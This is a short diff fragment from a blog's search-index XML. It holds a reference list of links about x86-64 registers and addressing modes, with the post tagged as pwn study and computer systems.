+<p>参考链接：<br>1.<a href="https://blog.csdn.net/qq_43401808/article/details/86506612" rel="noopener">https://blog.csdn.net/qq_43401808/article/details/86506612</a><br>2.<a href="https://www.cnblogs.com/wisehead/articles/3819233.html" rel="noopener">https://www.cnblogs.com/wisehead/articles/3819233.html</a><br>3.<a href="https://blog.csdn.net/yang_yulei/article/details/22613327" rel="noopener">https://blog.csdn.net/yang_yulei/article/details/22613327</a><br>4.<a href="https://www.jianshu.com/p/57128e477efb" rel="noopener">https://www.jianshu.com/p/57128e477efb</a><br>5.<a href="https://stackoverflow.com/questions/21165678/why-64-bit-mode-long-mode-doesnt-use-segment-registers" rel="noopener">https://stackoverflow.com/questions/21165678/why-64-bit-mode-long-mode-doesnt-use-segment-registers</a><br>6.<a href="https://blog.csdn.net/qq_35985044/article/details/81781884" rel="noopener">https://blog.csdn.net/qq_35985044/article/details/81781884</a><br>7.<a href="https://blog.csdn.net/weixin_40913261/article/details/90762210" rel="noopener">https://blog.csdn.net/weixin_40913261/article/details/90762210</a><br>8.<a href="https://www.polarxiong.com/archives/x64下PIC的新寻址方式-RIP相对寻址.html" rel="noopener">https://www.polarxiong.com/archives/x64下PIC的新寻址方式-RIP相对寻址.html</a><br>9.<a href="https://blog.csdn.net/weixin_41890599/article/details/99866410" rel="noopener">https://blog.csdn.net/weixin_41890599/article/details/99866410</a><br>10.<a href="https://blog.csdn.net/qq_43401808/article/details/86472254" rel="noopener">https://blog.csdn.net/qq_43401808/article/details/86472254</a><br>11.<a href="https://blog.csdn.net/qq_43401808/article/details/86472472" rel="noopener">https://blog.csdn.net/qq_43401808/article/details/86472472</a><br>12.<a href="https://blog.csdn.net/qq_43401808/article/details/86472592" rel="noopener">https://blog.csdn.net/qq_43401808/article/details/86472592</a><br>13.<a href="https://www.cnblogs.com/bxdm/p/6931562.html" rel="noopener">https://www.cnblogs.com/bxdm/p/6931562.html</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> pwn学习 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> register </tag>
+            
+            <tag> computer-system </tag>
+            
+        </tags>
+        
+    </entry>
+    
+  
+  
+</search>
